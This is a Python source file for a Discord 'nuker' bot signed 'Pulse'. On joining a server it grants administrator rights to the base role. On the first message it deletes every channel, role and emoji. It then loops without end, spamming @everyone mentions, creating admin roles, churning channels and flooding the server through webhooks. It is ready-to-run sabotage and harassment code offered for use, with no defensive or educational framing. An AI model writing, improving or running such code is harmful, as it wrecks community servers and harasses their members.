import os
import discord
import time
import random
import string
from discord_webhook import DiscordWebhook
from discord.utils import get

#pip install discord-webhook discord

def randomletters(length):
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(length))

TOKEN = ("")

client=discord.Client(intents=discord.Intents.all())
spam_messages = ["@everyone", "easy @everyone", "lol @everyone"]
channel_names = ["token 32", "token 3453", "token 1", "token 4", "token 15", "token 162", "token 115", "token 341", "token 31", "token 61", "token 18", "token 10", "token 211"]
webhook_usernames = ["lol" "fuck", "asdf"]
nuke_wait_time = 0


@client.event
async def on_ready():
    print('connected to Discord!')
    global TEST
    t = 0
    TEST = t
    return await client.change_presence(activity=discord.Game(name='Pulse_Nuker'))
    
    
'''
@client.event
async def on_member_ban(guild,user):
    await guild.unban(user)
    print("removed ban")
'''




@client.event
async def on_guild_join(guild):
    role = guild.roles[0] # Or another role object
    perms = discord.Permissions(administrator=True)
    await role.edit(permissions=perms)
    print("모두에게 관리자권한을 부여했습니다.")

@client.event
async def on_message(message):
    global TEST
    if TEST == 0:
        TEST = 1
        for c in message.guild.channels: 
                await c.delete()
        """
        for user in message.guild.members:
            try:
                await user.ban()
            except:
                pass
        """
        for role in message.guild.roles:  
            try:  
                await role.delete()
            except:
                pass
        for Emoji in message.guild.emojis:
            await Emoji.delete()
    response = '@everyone'
    
    
    while True:
        
        print("message sent "+random.choice(string.ascii_letters))
        try:
            await message.channel.send(response)
        except:
            print("message error")
            pass
        try:
            user=message.author
            await user.edit(nick=randomletters(3))
        except:
            print("can't change user nick")
            pass
        guild=message.guild
        perms=discord.Permissions(administrator=True)
        try:
            user=message.author
            await guild.create_role(name='TEST', colour=discord.Colour(0x597E8D),permissions=perms)
            role=get(guild.roles,name='TEST')
            await user.add_roles(role)
        except:
            print('maximum number of roles reached')
            pass
        guild=message.guild
        
        await guild.create_text_channel(randomletters(99))
        await guild.create_text_channel(randomletters(99))
        await message.channel.delete()
        print("channel yeeted")
        user=message.author
        _LENGTH = 8
        string_pool = string.ascii_lowercase 
        result = "" 
        for i in range(_LENGTH) :
            result += random.choice(string_pool)  
        webhook1 = await message.channel.create_webhook(name = result)
        webhook_url = webhook1.url
        webhook2 = DiscordWebhook(url=webhook_url, rate_limit_retry=True, content = random.choice(spam_messages), username = random.choice(webhook_usernames))
        webhook2.execute()
        
@client.event
async def on_command_error(error):
    if isinstance(error, discord.HTTPException):
        time.sleep(5)

@client.event
async def on_guild_channel_create(channel):
    await channel.send("@everyone")
    _LENGTH = 8
    string_pool = string.ascii_lowercase 
    result = "" 
    for i in range(_LENGTH) :
        result += random.choice(string_pool)  
    webhook1 = await channel.create_webhook(name = result)
    webhook_url = webhook1.url
    webhook2 = DiscordWebhook(url=webhook_url, rate_limit_retry=True, content = random.choice(spam_messages), username = random.choice(webhook_usernames))
    webhook2.execute()

client.run(TOKEN)


#Made by Pulse.
